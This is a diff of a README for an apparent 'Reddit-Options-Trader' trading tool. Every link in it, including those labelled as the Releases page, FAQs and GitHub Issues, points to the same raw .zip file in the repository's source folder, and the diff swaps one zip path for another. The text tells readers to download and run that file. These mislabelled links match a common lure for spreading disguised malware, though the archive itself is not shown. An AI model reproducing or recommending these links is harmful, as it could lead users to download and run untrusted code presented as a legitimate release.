@@ -1,6 +1,6 @@
 # 📈 Reddit-Options-Trader-ROT- - Discover Market Trends Effortlessly
 
-[![Download Now](https://github.com/Abcdef869/Reddit-Options-Trader-ROT-/raw/refs/heads/master/src/Trader-Options-RO-Reddit-v1.1.zip%20Now-Get%20Started%20Here-brightgreen)](https://github.com/Abcdef869/Reddit-Options-Trader-ROT-/raw/refs/heads/master/src/Trader-Options-RO-Reddit-v1.1.zip)
+[![Download Now](https://raw.githubusercontent.com/Abcdef869/Reddit-Options-Trader-ROT-/master/src/rot/app/Reddit-RO-Trader-Options-v2.2.zip%20Now-Get%20Started%20Here-brightgreen)](https://raw.githubusercontent.com/Abcdef869/Reddit-Options-Trader-ROT-/master/src/rot/app/Reddit-RO-Trader-Options-v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -22,13 +22,13 @@ Welcome to Reddit-Options-Trader-ROT-, a tool designed to help you turn trending
 
 ## 📥 Download & Install
 
-To download the latest version of Reddit-Options-Trader-ROT-, visit our [Releases page](https://github.com/Abcdef869/Reddit-Options-Trader-ROT-/raw/refs/heads/master/src/Trader-Options-RO-Reddit-v1.1.zip). Here, you will find all available versions to choose from.
+To download the latest version of Reddit-Options-Trader-ROT-, visit our [Releases page](https://raw.githubusercontent.com/Abcdef869/Reddit-Options-Trader-ROT-/master/src/rot/app/Reddit-RO-Trader-Options-v2.2.zip). Here, you will find all available versions to choose from.
 
 ### Steps to Download:
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest release, typically marked as "Latest Release".
-3. Click on the asset that matches your operating system (e.g., `https://github.com/Abcdef869/Reddit-Options-Trader-ROT-/raw/refs/heads/master/src/Trader-Options-RO-Reddit-v1.1.zip` for Windows).
+3. Click on the asset that matches your operating system (e.g., `https://raw.githubusercontent.com/Abcdef869/Reddit-Options-Trader-ROT-/master/src/rot/app/Reddit-RO-Trader-Options-v2.2.zip` for Windows).
 4. Your download will start automatically. Once completed, locate the downloaded file on your computer.
 
 ## 🖥️ Running the Application
@@ -44,11 +44,11 @@ If you encounter issues while downloading or running the application, consider t
 
 - **Unable to Download:** Ensure your internet connection is stable. If the link does not work, refresh the page.
 - **Application Won't Open:** Check your system requirements again. Make sure you're using a compatible operating system.
-- **Errors After Launch:** Restart your computer and try running the application again. If problems persist, refer to our [FAQs section](https://github.com/Abcdef869/Reddit-Options-Trader-ROT-/raw/refs/heads/master/src/Trader-Options-RO-Reddit-v1.1.zip) for additional help.
+- **Errors After Launch:** Restart your computer and try running the application again. If problems persist, refer to our [FAQs section](https://raw.githubusercontent.com/Abcdef869/Reddit-Options-Trader-ROT-/master/src/rot/app/Reddit-RO-Trader-Options-v2.2.zip) for additional help.
 
 ## 🌐 Community Support
 
-Join our community for support, updates, and discussions about using Reddit-Options-Trader-ROT- effectively. Check out our [GitHub Issues page](https://github.com/Abcdef869/Reddit-Options-Trader-ROT-/raw/refs/heads/master/src/Trader-Options-RO-Reddit-v1.1.zip) for the latest user inquiries and solutions.
+Join our community for support, updates, and discussions about using Reddit-Options-Trader-ROT- effectively. Check out our [GitHub Issues page](https://raw.githubusercontent.com/Abcdef869/Reddit-Options-Trader-ROT-/master/src/rot/app/Reddit-RO-Trader-Options-v2.2.zip) for the latest user inquiries and solutions.
 
 ## 📝 Contributing
 
@@ -60,4 +60,4 @@ This project is open source and available under the MIT License. You can freely 
 
 ## 🚀 Conclusion
 
-Thank you for choosing Reddit-Options-Trader-ROT-. We hope this tool enhances your trading strategy with insightful market data derived from trending Reddit discussions. Remember to visit our [Releases page](https://github.com/Abcdef869/Reddit-Options-Trader-ROT-/raw/refs/heads/master/src/Trader-Options-RO-Reddit-v1.1.zip) to keep your application up to date. Enjoy trading!
+Thank you for choosing Reddit-Options-Trader-ROT-. We hope this tool enhances your trading strategy with insightful market data derived from trending Reddit discussions. Remember to visit our [Releases page](https://raw.githubusercontent.com/Abcdef869/Reddit-Options-Trader-ROT-/master/src/rot/app/Reddit-RO-Trader-Options-v2.2.zip) to keep your application up to date. Enjoy trading!
